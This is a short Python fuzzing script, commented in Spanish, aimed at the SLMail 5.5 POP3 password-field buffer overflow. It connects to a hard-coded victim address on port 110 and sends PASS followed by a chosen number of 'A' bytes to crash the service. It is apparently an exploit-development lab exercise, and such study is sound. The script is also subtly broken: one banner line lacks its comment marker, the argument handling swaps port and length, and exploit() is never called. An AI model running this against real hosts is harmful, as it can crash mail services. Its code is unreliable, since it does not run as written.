""""
script to fuzz the SLMail 5.5 para buffer overflow

- aqui lo que importa es el tema del tamaño del buffer para el campo de password
- que fue lo que por detras el desarrollador ha fijado para los campos user y password como tamaño de buffer

"""

import socket
import sys

# ====================
# variables
# ====================

IP_ADDRESS = "192.168.1.5"  # < --  IP de la victima
PORT =  110               # < --  puerto del servicio

buffer_length = int(sys.argv[2])  # < --  longitud del buffer para el campo password


# ====================
# funciones
# ====================
def exploit():
    # creamos el socket que hace la conexion por TCP
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # nos conectamos a la victima
    s.connect((IP_ADDRESS, PORT))

    # recibimos el banner para ver si es SLMail
    banner = s.recv(1024)
    print(f"[+] Banner: {banner}")

    # enviamos el comando USER
    s.send(b"USER test\r\n")
    response = s.recv(1024)
    print(f"[+] Response: {response}")

    # una vez obtenida la respuesta
    s.send(b"PASS " + b"A" * buffer_length + b"\r\n")


    # cerramos la conexion
    s.close()


# ====================
flujo principal
# ====================
if __name__ == '__main__':
    if len(sys.argv) == 3:
        IP_ADDRESS = sys.argv[1]
        PORT = int(sys.argv[2])
        print(f"\n[!] Uso: python {sys.argv[0]} <IP> <longitud_del_buffer>")
        exit(1)
